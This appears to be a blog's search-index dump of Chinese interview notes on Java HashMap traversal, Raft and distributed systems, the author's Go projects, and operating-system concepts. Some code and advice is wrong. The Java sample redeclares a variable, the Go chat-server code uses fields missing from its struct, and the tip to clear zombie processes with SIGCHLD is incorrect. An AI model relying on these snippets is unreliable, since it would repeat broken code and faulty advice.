操作会导致线程不安全，具体来说会有数据覆盖的风险。HashMap遍历https://mp.weixin.qq.com/s/zQBN3UvJDhRTKP6SzcZFKw 结论，尽量使用 entrySet 来实现 Map 集合的遍历 不能再在遍历中使用集合 map.remove() 来删除数据，这是非安全的操作方式 但可以使用迭代器的 iterator.remove() 的方法来删除数据，这是安全的删除集合的方式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class HashMapTest &#123; public static void main(String[] args) &#123; // 创建并赋值 HashMap Map&lt;Integer, String&gt; map = new HashMap(); map.put(1, \"Java\"); map.put(2, \"JDK\"); map.put(3, \"Spring Framework\"); map.put(4, \"MyBatis framework\"); map.put(5, \"Java中文社群\"); // 迭代器 entrySet 遍历 Iterator&lt;Map.Entry&lt;Integer, String&gt;&gt; iterator = map.entrySet().iterator(); while (iterator.hasNext()) &#123; Map.Entry&lt;Integer, String&gt; entry = iterator.next(); System.out.println(entry.getKey()); System.out.println(entry.getValue()); &#125; // 迭代器 keySet 遍历 Iterator&lt;Integer&gt; iterator = map.keySet().iterator(); while(iterator.hasNext())&#123; Integer key = iterator.next(); System.out.println(key); System.out.println(map.get(key)); &#125; // for-each 遍历 entrySet() for (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123; System.out.println(entry.getKey()); System.out.println(entry.getValue()); &#125; // for-each 遍历 keySet() for (Integer key : map.keySet()) &#123; System.out.println(key); System.out.println(map.get(key)); &#125; // Lambda表达式 map.forEach((key, value) -&gt; &#123; System.out.println(key); System.out.println(value); &#125;); // Streams API 单线程 map.entrySet().stream().forEach((entry) -&gt; &#123; System.out.println(entry.getKey()); System.out.println(entry.getValue()); &#125;); // Streams API 多线程 map.entrySet().parallelStream().forEach((entry) -&gt; &#123; System.out.println(entry.getKey()); System.out.println(entry.getValue()); &#125;); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/categories/Java/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Java","slug":"Java","permalink":"http://waynamigo.github.io/tags/Java/"}]},{"title":"分布式理论","slug":"2023-01-06-面经分布式","date":"2023-01-05T16:00:00.000Z","updated":"2023-12-07T18:08:08.771Z","comments":true,"path":"2023/01/06/2023-01-06-面经分布式/","link":"","permalink":"http://waynamigo.github.io/2023/01/06/2023-01-06-面经分布式/","excerpt":"questions","text":"questions 如何设计一个高并发系统 高并发系统的目的是处理网络请求和数据的关系，瓶颈主要在内存，网络IO 如何解决10万非结构化数据查询请求这个问题要解决的主要是网络IO和非结构化存储的瓶颈问题。 首先数据库要支持非结构化的存储比如使用MongoDB的文档存储使用gridFS进行分布式存储 然后对于每秒的十万的网络请求，最常见的方法，以及目前的主流方法是拆分微服务，使用负载均衡策略将请求有效分发到不同 对于数据的存储和查询，现在主流也是分布式数据库，比如ES和MongoDB，PG的集群都可以创建非结构化数据的索引，在业务逻辑中优化sql查询语句等 使用redis做缓存，对于某些大型的非结构化数据，可以使用cdn去存储静态资源 如果是百台以内的机器 常用的有两种方便的方法，一个是fabric多个ssh同步文件，这也是阿里云和百度云针对个人用户提供的一种解决方案 配置集群以后，rsync同步一个文件夹下的某个文件。CAP理论 Consistency（一致性）、Availability（可用性）、Partition Tolerance（分区容错性） raft理论leader选举、日志复制、日志压缩、成员变更 Leader Selection Raft使用 (心跳机制)来触发选举。当server节点启动时，初始状态都是 follower。每一个server都有一个定时器，超时时间为 (时间长 度一般为150ms~300ms)，如果某server没有超时的情况下收到来自leader或者 candidate的任何RPC，则定时器重启，如果超时，它就开始一次选举。leader给 followers发RPC要么复制日志，要么就是用来告诉followers自己是leader，不用选举的 心跳(告诉followers对状态机应用日志的消息夹杂在心跳中)。如果某个candidate获 得了超过半数节点的选票(自己投了自己)，就称为新leader 如果leader节点出现了故障用raft共识算法来做的 Log Relocation leader 在每个 heartbeat 向 follower 发送AppendEntries RPC同步日志，follower如果发现没问题，复制成功后会 给leader一个表示成功的ACK，leader收到超过半数的ACK后应用该日志，返回客户 端执行结果。若 follower 节点宕机、运行缓慢或者丢包，则 leader 节点会不断重试 AppendEntries RPC，直到所有 follower 节点最终都复制所有日志条目。 乐观锁：每个对象有一个版本号或者时间戳，当对象被修改时，版本号会更新。在提交更新时，检查版本号是否匹配，如果不匹配则说明有冲突发生，需要进行相应的处理。悲观锁：在操作对象时，先锁定该对象，其他用户无法修改该对象直到锁被释放。这种方法可以保证同时只有一个用户能够修改对象，但可能会导致并发性能下降。 服务注册与发现 consul 负载均衡，consul，用wrr算法实现的 APi网关 gateway 熔断器 circuitbreakerraft算法流程Raft算法分为两个阶段，首先是选举过程，然后在选举出来的领导人带领进行正常操作，主要用于管理复制日志的一致性算法。Raft算法三模块：领导人选举、日志复制、安全性。领导人Leader选举Raft通过选举一个领导人，然后给予他全部的管理复制日志的责任来实现一致性。三个角色(任何服务器都可以当三个角色之一)：领导者(leader)：处理客户端交互，日志复制等动作，一般一次只有一个领导者候选者(candidate)：候选者就是在选举过程中提名自己的实体，一旦选举成功，则成为领导者跟随者(follower)：类似选民，完全被动的角色，这样的服务器等待被通知投票理解：当服务启动的时候，所有服务器follower都是初始状态，每个服务器都有一个定时器，超时时间为election timeout（一般为150-300ms），当某个服务器达到超时时间，他就成为了候选者，先给自己投上一票，然后发送消息给其他服务器，当其他服务器超过半数收到了他的消息，相当于获取到了选票，他就成了领导者，而其他服务器全部成了跟随者，这时候领导者就开始根据间隔时间向跟随者发送心跳检测包，证明我还活在，也就是心跳机制，而跟随者每次接受到消息，就初始化自己内部的定时器，当某个服务器定时器达到超时时间，没有收到领导者的消息，那么跟随者会觉得领导者挂了，他就摇身一变称为候选者，开始篡位，重复之前的过程，成为领导者，当他成为领导者之后，当前任领导者就算回来了，也只能变成跟随者。特殊情况：四个服务器，当其中两个服务器同时达到超时成为候选者，并且每个服务器拿到自己一票，另外一个服务器一票，这时候的机制就是这两个服务器重新定时，先达到超时的服务器成为候选者，并发送通知进一步成为选举者。 日志复制（保证数据一致性）Leader选出后，就开始接收客户端的请求。Leader把请求作为日志条目（Log entries）加入到它的日志中，然后并行的向其他服务器发起 AppendEntries RPC复制日志条目。当这条日志被复制到大多数服务器上，Leader将这条 日志应用到它的状态机并向客户端返回执行结果。1）客户端的每一个请求都包含被复制状态机执行的指令。2）leader把这个指令作为一条新的日志条目添加到日志中，然后并行发起 RPC 给其他的服务器，让他们复制这条 信息。3）跟随者响应ACK,如果 follower 宕机或者运行缓慢或者丢包，leader会不断的重试，直到所有的 follower 最终都 复制了所有的日志条目。4）通知所有的Follower提交日志，同时领导人提交这条日志到自己的状态机中，并返回给客户端。 分布式session怎么做的，常用的java有apach shiro这两个中间件有session管理器，它是配置redis共享缓存的服务器中的，使用的是RedisSessionDAO层。 golang有casbin+redis的共享缓存来实现分布式session管理 身份认证和权限管理https://zhuanlan.zhihu.com/p/150644469 https://www.cnblogs.com/alisapine/p/15080359.html 分布式事务和分布式锁 分布式锁通常用于控制多个节点或进程之间对共享资源的并发访问，以避免竞态条件和数据损坏。 分布式事务通常涉及多个事务性操作后的一致性，如数据库更新、消息发布等，需要确保这些操作在分布式系统中以事务的方式执行。 场景问题集合一个外卖平台上有一个外卖单子，现在有多名骑手想接这一单，如何保证只有一个骑手可以接到单子？如何把一个文件快速下发到100w个服务器？给每个组分配不同的IP段，怎么设计一种结构使的快速得知IP是哪个组的?典型TOPk系列的问题：10亿个数，找出最大的10个。等(10万个数，输出从小到大？有十万个单词，找出重复次数最高十个？)让你设计一个微信发红包的api，你会怎么设计，不能有人领到的红包里面没钱，红包数值精确到分。分布式多个机器生成id，如何保证不重复?扫码登录是如何实现的？分布式集群中如何保证线程安全？某网站/app首页每天会从10000个商家里面推荐50个商家置顶，每个商家有一个权值，你如何来推荐？第二天怎么更新推荐的商家？如何设计一个本地缓存？需要考虑哪些方面？ 项目开放性问题1、找个印象最深的项目说说？(简历中不止一个项目)2、你项目中遇到的最大的问题是什么？你是怎么解决的？3、你项目中用到的技术栈是如何学习的？4、为什么做这个项目，技术选型为什么是这样的？5、登录怎么做的？单点登录说说你的理解？6、项目遇到的最大挑战是什么？(类似问题2)7、说说项目中的闪光点和亮点？8、项目怎么没有尝试部署上线呢？9、介绍项目具体做了什么？(项目背景)10、如果让你对这个项目优化，你会从哪几个点来优化呢？","categories":[{"name":"分布式","slug":"分布式","permalink":"http://waynamigo.github.io/categories/分布式/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"分布式","slug":"分布式","permalink":"http://waynamigo.github.io/tags/分布式/"}]},{"title":"Project","slug":"2023-01-06-面试项目","date":"2023-01-05T16:00:00.000Z","updated":"2023-11-19T01:08:49.566Z","comments":true,"path":"2023/01/06/2023-01-06-面试项目/","link":"","permalink":"http://waynamigo.github.io/2023/01/06/2023-01-06-面试项目/","excerpt":"嘴太笨了","text":"嘴太笨了 Go数字孪生项目背景：企业合作项目。负责设计开发数据采集与指令下发模块，实现车间物理设备与Unity模拟软件的实时状态映射。 这个项目是老师和科大讯飞与农科信创这个公司合作的一个数字化管理系统，这个项目虽然叫数字孪生但是您可以把它当作一个游戏前端+共享文档来看，客户端程序我们用的unity开发的，农科信创提供的了数字资产和传感器，科大讯飞提供了一部分深度学习模型，做的事包括产量预估、病虫害表型鉴定、采摘车的三维图像定位（通过ROS控制）、异常人员检测，这个项目我做的事就基于go做的后端，一个是监听、收集和预处理数据发送到模型端，一个是提供给unity接口支持多个用户去操作边缘设备（调整温度光照，要更改采摘车的采摘顺序），将模型处理后的统计数据、实体状态呈现给前端。 项目难点：根据传感器文档构建指令，指令是通过状态写入协议来进行的；处理多个用户操作同一个对象的冲突问题。 后端主要基于Gin和Zinx开发，连接Unity端收发实时数据，提供用户控制端Web服务接口 使用gRPC对序列化后的对象消息进行流式传输，保证服务器端与Unity端的高效同步 使用MongoDB存储服务器端的统计数据、历史设备指令与数字工厂状态的日志文件提供历史状态查询与回滚操作 gin做的是登陆认证、资产文件上分片上传/拉取功能，存储在mongodb，资产文件用gridFS。以及获取grpc通信的结构体解析成XML的功能，unity前端有一个功能是鼠标移动到实例上就有一个悬浮框显示所有属性 数据接收模块：传感器都是基于UDP的协议进行上传，频率有高有低，所以对一个传感器go了一个routine，在这个routine里接收解析所需的数据进行解析完，处理成结构体之后，用grpc的stream消息发到GPU服务器上部署的模型来处理。 用户在unity端的操作和指令下发是用zinx实现的，它是一个TCP长连接框架，然后服务器端去实现温度、土壤、种植区、采摘车这些实体对象与现实状态的同步，（比如控制土壤ph、二氧化碳浓度、控温、光谱开关、采摘车路线修正）包括位置、惯导的方位角，角速度线速度等（用MSO格式封装的报文），在用户端封装的控制指令以bytes的形式用zinx的DataPack封装，封装的控制指令转发到终端设备的service 如果有多个用户并发要对这个对象操作，在这个处理的goroutine中可能会造成冲突，我们维护了一个对象map，对这个map加锁处理，对于采摘车的话，是单独维护了一个处于三维坐标系下的对象。 用到channel的场景：一个预测服务中，对发送数据的goroutine是配套的， 历史状态查询的话，是根据mongo中存储各对象的历史状态，根据时间戳向前端的拉取。 是做用户在本地对传感器做操作后，连接的控制终端，比如采摘车的路径校准、和毫米波雷达的控制，主要包括DIFOP设备信息输出协议，用户配置写入协议UCWP 在服务器端连接mongodb，服务器数据收集、统计计算、上传数据库 Go 轻量聊天APP（Go/Kratos/GPT2）项目角色：唯一贡献者项目背景：该软件作为当时学习Go语言微服务框架与组件的个人练手项目。聊天以群组的形式进行，将基于GPT2的bot与聊天室服务拆分成微服务，主要包括用户信息服务、群组管理服务、消息传输服务、GPT会话存储服务四个。 使用的微服务框架为Kratos，开发组件和工具主要包括Redis/Go-kit/Swagger 遵循微服务部署流程，微服务使用k8s部署，dlv调试工具，godoc自动化生成文档等 数据库123456用户表用户id，密码，密码哈希值，salt群组表群组id, 用户id, 权限值聊天记录表key：userid, groupid,timestamp做的索引 缓存用户信息服务 查看个人/他人信息功能 更改字段功能 增加删除(注销)功能 登陆模块：用户输入用户名、密码 注册时提供密码，系统为用户生成唯一salt 将密码的字符串salt与原字符串拼接，得到hash 数据库存储 hash 和 salt 登陆时将字符串与salt连接后的到hash’，判断hash’ == hash 验证正确后，服务端使用jwt机制，进行API调用（库使用的jwt-go jwt优点 更适用CDN: 可以通过内容分发网络请求你服务端的所有资料 Token机制在服务端不需要存储session信息，因为Token 自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息. 去耦: 不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可. 更适用于移动应用: 当你的客户端是一个原生平台（iOS, Android，Windows 8等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。 群组管理服务 邀请加入用户byID 踢出用户byID消息传输服务 群组以聊天室为单位进行，一个聊天室对应一个Pod 主要包括ChatRoomClient和ChatRoomServer ChatRoomClient 主要负责与前端通信和处理与当前用户相关的信息 ChatRoomServer 则负责维护所有在线用户信息以及处理消息的分发12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364type ChatRoomClient struct &#123; roomId int user User conn net.Conn //与前端维持的通信连接&#125;type ChatRoomServer struct &#123; clients map[string]*ChatRoomClient // 维护一个连接池 rooms map[string][]*ChatRoomClient // 用于维护聊天室与客户端的关系&#125;// SendMessage 方法用于发送消息给聊天室func (c *ChatRoomClient) SendMessage(message string) &#123; c.server.BroadcastMessage(c.RoomID, c.UserID, c.UserName, message)&#125;// Disconnect 方法处理客户端断开连接的情况func (c *ChatRoomClient) Disconnect() &#123; c.server.RemoveClient(c)&#125;// NewChatRoomServer 方法用于创建一个新的ChatRoomServer对象func NewChatRoomServer() *ChatRoomServer &#123; return &amp;ChatRoomServer&#123; clients: make(map[string]*ChatRoomClient), rooms: make(map[string][]*ChatRoomClient), &#125;&#125;// AddClient 方法将一个客户端添加到服务器func (s *ChatRoomServer) AddClient(client *ChatRoomClient) &#123; s.clients[client.ConnectionID] = client&#125;// RemoveClient 方法将一个客户端从服务器移除func (s *ChatRoomServer) RemoveClient(client *ChatRoomClient) &#123; delete(s.clients, client.ConnectionID) // 在此处也可以将客户端从对应的聊天室中移除&#125;// JoinRoom 方法将一个客户端加入到指定聊天室中func (s *ChatRoomServer) JoinRoom(client *ChatRoomClient, roomID string) &#123; s.rooms[roomID] = append(s.rooms[roomID], client) client.RoomID = roomID&#125;// LeaveRoom 方法将一个客户端从指定聊天室中移除func (s *ChatRoomServer) LeaveRoom(client *ChatRoomClient, roomID string) &#123; clients := s.rooms[roomID] for i, c := range clients &#123; if c.ConnectionID == client.ConnectionID &#123; // 从聊天室中移除客户端 s.rooms[roomID] = append(clients[:i], clients[i+1:]...) client.RoomID = \"\" // 将客户端的聊天室ID清空 break &#125; &#125;&#125;// BroadcastMessage 方法向指定聊天室内的所有客户端广播消息func (s *ChatRoomServer) BroadcastMessage(roomID, userID, userName, message string) &#123; clients := s.rooms[roomID] for _, client := range clients &#123; go func(client *ChatRoomClient) &#123; // 在协程中处理消息发送 client.SendMessage(userID, userName, message) &#125;(client) &#125;&#125; 消息传输的并发处理和消息分发问题是怎么解决的消息发送时，一个客户端的sendmessage用一个goroutine进行 可能出现的并发安全问题 map互斥锁 在 ChatRoomServer 中的 rooms 和 clients 字典是共享的数据结构，多个goroutine可能会同时访问或修改这些数据结构，可能导致竞态条件（race condition）或数据不一致的问题。 kratos进行微服务间的通信这些服务的通信都是一些很轻量的元数据，kratos的用protobuf定义的middleware gRPC API 进行接口交互，服务架构需要使用统一的元信息（Metadata）传输进行微服务间的传递。 目前 gRPC 中可以携带元信息传递，原理是将元信息放入 HTTP Header 中，这样上游即可收到对应的元信息 信息。 因此在Kratos的设计上，也是通过 HTTP Header 进行传递。在框架中先将元信息包封装成key/value结构，然后携带到 Transport Header 中。 服务注册创建一个 Registrar（以 consul 为例），将 Registrar 注入进 Kratos 应用实例中，Kratos 会自动完成实例注册和反注册 1234567891011121314151617181920212223242526import ( consul \"github.com/go-kratos/kratos/contrib/registry/consul/v2\" \"github.com/hashicorp/consul/api\")// new consul clientclient, err := api.NewClient(api.DefaultConfig())if err != nil &#123; panic(err)&#125;// new reg with consul clientreg := consul.New(client)app := kratos.New( // service-name kratos.Name(Name), kratos.Version(Version), kratos.Metadata(map[string]string&#123;&#125;), kratos.Logger(logger), kratos.Server( hs, gs, ), // with registrar kratos.Registrar(reg),) 用的是kratos的负载均衡器12345678910111213type Selector interface &#123; // Selector 内部维护的服务节点列表通过 Rebalancer 接口来更新 Rebalancer // Select nodes // if err == nil, selected and done must not be empty. Select(ctx context.Context, opts ...SelectOption) (selected Node, done DoneFunc, err error)&#125;// 通过 Rebalancer 实现服务节点变更感知type Rebalancer interface &#123; Apply(nodes []Node)&#125; 用的默认的wrr算法 Weighted round robin rpc是什么 远程过程调用 和rmi的区别【RMI相当于RPC的一种实现】 RPC (Remote Procedure Call) 采用客户端/服务器方式 (请求/响应)，发送请求到服务器端，服务端执行方法后返回结果。 优点是跨语言跨平台，缺点是编译期无法排错。返回的对象由外部数据表示 RMI (Remote Method Invocation) 客户端jvm调用服务端jvm的方法，直接获取远端方法的签名，进行调用。优点是强类型、编译期可检查错误；缺点是只限于java语言。返回的对象可以是java支持的所有对象名。 RPC的代理类stub，将消息序列化为RPCrequest/RPCresponse RMI流程原理 定义远程接口interface Rmiiface extends Remote 实现一个远程接口类MyRemoteObject implements Rmiiface 服务器端注册和查找远程对象 123456789101112public class Server &#123; public static void main(String[] args) &#123; try &#123; Rmiiface remoteObject = new MyRemoteObject(); Registry registry = LocateRegistry.createRegistry(1099); // 默认 RMI 注册表端口号为 1099 registry.bind(\"MyRemoteObject\", remoteObject); System.out.println(\"Server is ready.\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 客户端查找注册表来获取远程方法 123456789101112public class Client &#123; public static void main(String[] args) &#123; try &#123; Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099); MyRemoteInterface remoteObject = (MyRemoteInterface) registry.lookup(\"MyRemoteObject\"); String response = remoteObject.sayHello(); System.out.println(response); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 通过JRMP协议来通信 grpc基于protobuf序列化协议的通讯协议","categories":[{"name":"Golang","slug":"Golang","permalink":"http://waynamigo.github.io/categories/Golang/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"DigitalTwins","slug":"DigitalTwins","permalink":"http://waynamigo.github.io/tags/DigitalTwins/"}]},{"title":"Operating System","slug":"2023-01-05-面经操作系统","date":"2023-01-04T16:00:00.000Z","updated":"2023-12-02T07:39:15.516Z","comments":true,"path":"2023/01/05/2023-01-05-面经操作系统/","link":"","permalink":"http://waynamigo.github.io/2023/01/05/2023-01-05-面经操作系统/","excerpt":"questions","text":"questions 基础概念 线程安全（Thread Safety）： 当多个线程访问某个类或者对象时，如果不需要额外的同步机制或者用户干预，这个类或者对象依然能够表现出正确的行为，那么它就被认为是线程安全的。简而言之，线程安全意味着在多线程环境下，对象的状态不会发生不一致或者不正确的情况。 线程不安全（Thread Unsafe）： 相反，当多个线程访问某个类或者对象时，如果没有适当的同步措施，就可能导致对象的状态变得不可预测或者不正确，那么这个类或者对象就是线程不安全的。在线程不安全的情况下，多个线程可能会在同一时间访问、修改相同的数据，这可能导致数据损坏或者不一致。 用户态和内核态用户态(User Mode) : 用户态运行的进程可以直接读取用户程序的数据内核态(Kernel Mode)：内核态运行的进程几乎可以访问计算机的任何资源包括系统的内存空间、设备、驱动程序等 如何切换用户态和内核态 系统调用：比如open close write read，还有一堆IO函数 中断：当外围设备完成用户请求的操作后，会向 CPU 发出相应的中断信号 异常：缺页异常等12341. 系统调用：是一种软中断处理程序，用于让程序从用户态陷入内核态，以执行相应的操作流程：中断，保存现场，陷入内核态，执行完恢复现场（上下文），从保存的地址开始继续执行（产生中断的那一句）2. 中断分软和硬中断，由中断向量表（中断号-中断程序入口地址）和中断处理程序完成。 进程上下文包括哪些 进程控制块 PCB CPU寄存器状态 程序计数器 进程和线程的区别 进程是系统资源分配的基本单位，一个程序对应一个进程。每个进程都有自己独立的内存空间，相互之间不会共享。它包括了程序代码、内存空间、资源和文件等。 线程是进程中的执行单元，一个进程可以包含多个线程。线程共享了进程的内存空间和资源，可以同时执行不同的任务。 共享资源指的是哪些资源内存、全局变量、对象、文件等 协程和线程的区别协程（goroutine）可以理解为轻量化的用户态线程的实现，区别是协程由goruntime进行调度，线程由操作系统内核调度 进程切换： 保存当前进程上下文：当操作系统决定要切换到另一个进程时，首先会保存当前进程的上下文信息，包括寄存器的值、程序计数器（PC）等。 加载目标进程的上下文：接下来，操作系统会从进程调度队列中选择一个新的进程，将其保存的上下文信息加载到 CPU 寄存器中，以便开始执行该进程。 切换页表：在多进程的环境下，每个进程都有自己独立的地址空间（虚拟内存），因此在切换进程时，需要将当前进程的页表（用于地址映射）切换为目标进程的页表。 恢复执行：一旦目标进程的上下文信息被加载，CPU 会从目标进程的上次停止的位置继续执行。 与线程切换的区别： 线程切换发生在用户态，进程切换发生在内核态。 线程切换相对于进程切换来说更加轻量级，因为线程共享了同一地址空间和其他资源，上下文切换的开销较小。 进程间的通信方式 共享内存 管道 半双工 信号 signal ，用于处理异步事件，如外部中断、错误、异常等情况 信号量 semaphore（mutex）实现进程间的互斥与同步，int计数器 消息队列 保存在内核中的消息链表 socket线程同步的方式有哪些 互斥锁 读写锁 自旋锁 适用于锁被持有时间较短的情况：线程尝试获得锁时，如果锁已被占用，线程会一直忙等待直到锁被释放 信号量 条件变量 原子操作fork子进程与父进程的区别在调用 fork() 函数时，操作系统会创建一个新的进程，这个新的进程称为子进程。子进程是父进程的一个复制，它将继承父进程的内存空间、文件描述符等资源。fork之后，子进程和父进程之间是完全独立进行，互不干扰。 死锁定义&amp; 产生条件定义：死锁（Deadlock）是指在多个进程或线程之间，每个进程或线程都在等待一个事件，而这个事件只能由其他等待的进程或线程触发，从而导致所有进程或线程都无法继续执行的一种状态。 产生条件 互斥（Mutual Exclusion）：资源只能被一个进程或线程占用，如果资源被占用，其他进程或线程必须等待。 持有和等待（Hold and Wait）：一个进程或线程可以在持有某个资源的同时等待其他资源，这时如果其他资源被占用，就会导致死锁。 不可剥夺（No Preemption）：资源不能被强制从一个进程或线程中抢占，只能由占用它的进程或线程显式释放。 循环等待（Circular Wait）：多个进程或线程之间形成一个环路。 进程调度策略 先来先服务 短进程优先 时间片轮转 优先级队列 多级反馈队列页面置换算法 先进先出 最近最久未使用（手撕） 磁盘调度 先来先服务 最短寻道优先 扫描算法分页是什么，内存页面分页是操作系统中一种内存管理技术。 优势 虚拟内存的实现：允许程序使用比实际物理内存更大的地址空间。 分页策略：可以实现页面置换算法，将不常用的页置换到磁盘上。 内存保护：可以将页设置为只读或只执行，从而保护程序的关键部分不被修改。 内存共享：多个进程可以共享相同的物理页，减少了内存的占用。 分段是什么，存在碎片问题与分页不同，分段不将内存划分为固定大小的块，而是将其划分为逻辑上相关联的段，每个段的长度可以不同。 优势 更灵活的内存管理：可以根据程序的需要分配不同大小的段，更好地利用内存。 更好的地址空间划分：可以将程序的不同部分（如代码、数据、堆栈等）放置在不同的段中，提高了程序的可读性和可维护性。 内存保护：可以通过设置段的权限（如只读、读写等）来保护程序的关键部分，防止非法访问。 共享和动态加载：不同程序可以共享相同的段，也可以在运行时动态加载和卸载段。 使用场景 动态链接库（DLL）：在操作系统中，动态链接库通常会以独立的段来存放，这样可以在运行时被加载和卸载。 程序的逻辑结构：将程序的不同部分（如代码段、数据段、堆栈段等）放置在不同的段中，可以使程序的逻辑结构更清晰，提高可读性和可维护性。 内存保护：可以通过设置段的权限来保护程序的关键部分，防止非法访问。例如，将代码段设置为只读，防止在运行时修改代码 虚拟内存通过将程序的逻辑地址空间映射到物理内存或磁盘上的存储空间来实现。实现技术：分页和分段技术 隔离进程：物理内存通过虚拟地址空间访问，虚拟地址空间与进程一一对应。每个进程都认为自己拥有了整个物理内存，进程之间彼此隔离，一个进程中的代码无法更改正在由另一进程或操作系统使用的物理内存。 提升物理内存利用率：有了虚拟地址空间后，操作系统只需要将进程当前正在使用的部分数据或指令加载入物理内存。 简化内存管理：进程都有一个一致且私有的虚拟地址空间，程序员不用和真正的物理内存打交道，而是借助虚拟地址空间访问物理内存，从而简化了内存管理。 多个进程共享物理内存：进程在运行过程中，会加载许多操作系统的动态库。这些库对于每个进程而言都是公用的，它们在内存中实际只会加载一份，这部分称为共享内存。 提高内存使用安全性：控制进程对物理内存的访问，隔离不同进程的访问权限，提高系统的安全性。 提供更大的可使用内存空间：可以让程序拥有超过系统物理内存大小的可用内存空间。这是因为当物理内存不够用时，可以利用磁盘充当，将物理内存页（通常大小为 4 KB）保存到磁盘文件（会影响读写速度），数据或代码页会根据需要在物理内存与磁盘之间移动。 如果没有虚拟内存的话 容易爆内存，内存不够用 浪费内存，内存崩溃等，根据局部性原理 局部性原理时间局部性：如果一个数据项被访问，那么在不久的将来它很可能再次被访问。这意味着程序往往会重复使用相同的数据。空间局部性：如果一个数据项被访问，那么在它附近的数据也很可能会被访问。这意味着程序往往会以块或连续区域的方式访问数据。 TLB是什么快表，或者叫cache缓存了虚拟页号到物理页号的映射关系，你可以将其简单看作是存储着键（虚拟页号）值（物理页号）对的哈希表 123456使用 TLB 之后的地址翻译流程是这样的：1. 用虚拟地址中的虚拟页号作为 key 去 TLB 中查询；2. 如果能查到对应的物理页的话，就不用再查询页表了，这种情况称为 TLB 命中（TLB hit)。3. 如果不能查到对应的物理页的话，还是需要去查询主存中的页表，同时将页表中的该映射表项添加到 TLB 中，这种情况称为 TLB 未命中（TLB miss)。4. 当 TLB 填满后，又要登记新页时，就按照一定的淘汰策略淘汰掉快表中的一 交换空间（Swap分区）当物理内存不足时，操作系统会将一部分不常用的数据（可能是程序的代码、数据等）从物理内存移动到磁盘上的交换文件（Swap File）或者交换分区（Swap Partition）中。这样，物理内存就会腾出空间来运行当前活动的程序。当需要访问被移到交换空间的数据时，操作系统会将其再次加载到物理内存中。 缓冲区泄漏当程序向缓冲区写入超过其容量的数据时，会覆盖相邻内存区域的数据或者控制程序的执行流程，从而可能导致程序崩溃或者执行意外的行为。 程序崩溃：如果溢出的数据覆盖了程序关键的数据或者控制信息，可能会导致程序崩溃或异常终止。 提权漏洞：如果一个程序以特权用户或系统管理员的身份运行，并且存在缓冲区溢出漏洞，攻击者可以利用这个漏洞来提升自己的权限，获取对系统的控制权。 执行恶意代码：攻击者可以通过精心构造的输入数据来覆盖程序的返回地址或者函数指针，从而强行将程序执行流程转移到恶意代码所在的地址，实现远程代码执行攻击。 信息泄露：攻击者可以利用缓冲区溢出漏洞来读取程序内部的数据，可能包括敏感信息、密码等。 僵尸进程和孤儿进程僵尸进程：子进程结束，父进程不知道，导致子进程的资源没被释放定义：僵尸进程是已经结束执行的子进程，但其父进程尚未调用wait()或waitpid()系统调用来获取子进程的退出状态，因此子进程的资源（如进程表项、文件描述符等）尚未被完全释放。 状态：僵尸进程处于”Z”状态（在ps命令中以”Z”标识），找到Z状态kill掉。 123ps -aux | grep Zkill -s SIGCHLD &lt;PID&gt; #SIGCHLD信号是一个用于通知父进程子进程状态变化的信号。通过向僵尸进程发送这个信号 危害：僵尸进程占用了系统资源（如进程表项），如果大量的僵尸进程积累，可能会导致系统资源不足。 孤儿进程：父进程结束，子进程还在执行，会被init进程接管定义：孤儿进程是指一个子进程的父进程提前结束了，而子进程还在继续运行。此时，子进程会被init进程（PID为1）接管，成为init的子进程。状态：孤儿进程的状态正常，不会变成僵尸进程，因为init进程会负责回收孤儿进程的资源。危害：一般情况下，孤儿进程并不会造成严重问题。但如果大量的孤儿进程在系统中运行，可能会占用系统资源，因此最好的做法是在父进程退出前，确保它的子进程已经正确地结束。 重点：IO多路复用IO Multiplexing是指通过一种机制同时监听多个文件描述符（sockets、文件、设备等），当其中任意一个文件描述符就绪（可读、可写或异常）时，就可以对其进行相应的处理，从而提高了系统的性能和响应速度。 select 轮训，在一个数组中注册多个文件描述符，数据量少时效果好 数据结构：数组 poll 轮训，数据量多时效果好 数据结构：链表 epoll 使用了事件驱动的方式来管理文件描述符，只有当文件描述符真正就绪时才会通知应用程序 数据结构：红黑树 优点：相对于select和poll，epoll的性能更高，因为它采用了红黑树的数据结构来管理文件描述符，可以处理大量的文件描述符，并且在文件描述符就绪时会立即得到通知。 硬连接 软连接硬连接 硬链接与原文件共享同一个索引节点，具有相同的 Inode 号。 不能连接目录，防止形成环软连接 软链接是一个单独的文件，其中包含了指向目标文件的路径信息。 能连接目录 删除源文件，软连接失效，硬连接还嫩用，因为原来的Inode还在用 中断的处理过程 中断触发，事件可能包括定时器结束，系统调用，异常等 中断请求，向CPU发送通知，我要处理一个终端 中断控制器（Interrupt Controller）将中断请求映射到一个中断向量，对应了中断处理程序的入口地址，是映射关系，类似于函数指针。 根据中断向量表将中断向量映射到实际的中断处理程序的入口地址。 保存上下文 执行中断服务程序 关中断 恢复现场后，重新执行产生中断的那一句指令 中断和轮训 触发条件不同，中断是被动条件触发（定时器结束、产生异常），轮训是主动查询资源状体啊 响应能力不同，中断实时发生，论文有延迟 轮训同步，中断异步 零拷贝零拷贝是一种优化数据传输的技术，它通过减少或消除数据在内存之间的复制过程来提高传输效率，从而在高性能的数据传输场景中发挥重要作用。 传递文件描述符 允许内核缓冲区直接访问 DMA sendfile() 将一个文件描述符的内容发给另一个 mmap()文件映射到内存 Redis：Redis 通过使用 sendfile 系统调用，实现了零拷贝技术，可以在文件传输时避免数据在用户空间和内核空间之间的多次拷贝。 Kafka：Kafka 